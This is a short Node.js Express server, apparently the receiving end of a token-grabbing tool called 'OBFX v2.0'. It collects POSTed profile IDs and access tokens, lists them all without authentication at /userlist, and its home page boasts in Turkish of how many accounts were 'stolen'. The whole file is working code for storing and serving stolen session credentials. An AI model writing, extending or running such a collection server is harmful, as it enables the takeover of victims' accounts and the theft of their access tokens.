const express = require('express');
const app = express();
app.use(express.json());

let users = []; // { profileId: "160361a172444f0c9054d554423ef6e2", accessToken: "eyJ..." }

app.post('/adduser', (req, res) => {
  const { profileId, accessToken } = req.body;
  if (profileId && accessToken) {
    // Aynı profileId varsa güncelle, yoksa ekle
    const existing = users.find(u => u.profileId === profileId);
    if (existing) {
      existing.accessToken = accessToken;
    } else {
      users.push({ profileId, accessToken });
    }
    console.log(`Yeni hesap eklendi → ${profileId}`);
    res.json({ success: true, total: users.length });
  } else {
    res.status(400).json({ success: false });
  }
});

app.get('/userlist', (req, res) => {
  res.json({
    total: users.length,
    accounts: users
  });
});

app.get('/', (req, res) => {
  res.send(`<h1>OBFX v2.0 Aktif — Toplam ${users.length} hesap çalındı 🔥</h1>`);
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log('OBFX WebSocket Çekici çalışıyor →', port);
});
